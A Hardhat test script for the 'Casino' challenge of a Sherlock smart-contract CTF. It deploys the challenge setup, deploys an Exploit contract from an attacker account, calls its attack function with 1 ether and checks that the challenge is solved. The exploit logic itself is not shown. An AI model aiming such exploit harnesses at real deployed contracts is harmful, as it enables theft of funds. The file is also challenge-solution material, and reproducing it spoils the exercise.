import { expect } from "chai";
import hre, { ethers } from "hardhat";

import { Contract } from "ethers";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { Casino } from "../types";

describe("Sherlock CTF: Casino (Baraa42)", () => {
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  let setup: Contract;
  let casino: Casino;

  before(async () => {
    [deployer, attacker] = await ethers.getSigners();

    if (hre.network.name === "hardhat") {
      const SetupFactory = await ethers.getContractFactory("contracts/Baraa42/Setup.sol:Setup", deployer);
      setup = await SetupFactory.deploy({ value: ethers.utils.parseEther("1") });
    } else {
      setup = await ethers.getContractAt(
        "contracts/Baraa42/Setup.sol:Setup",
        `0xFfb20eF6668F8160934FD84b60F3DeD127F787Aa`
      );
    }
    casino = await ethers.getContractAt("Casino", await setup.casino());
  });

  it("Exploit", async () => {
    // Contract Attack
    const ExploitFactory = await ethers.getContractFactory("contracts/Baraa42/Exploit.sol:Exploit", attacker);
    const exploit = await ExploitFactory.deploy(casino.address);
    await exploit.attack({ value: ethers.utils.parseEther("1") });
  });

  after(async () => {
    expect(await setup.isSolved()).to.be.true;
  });
});
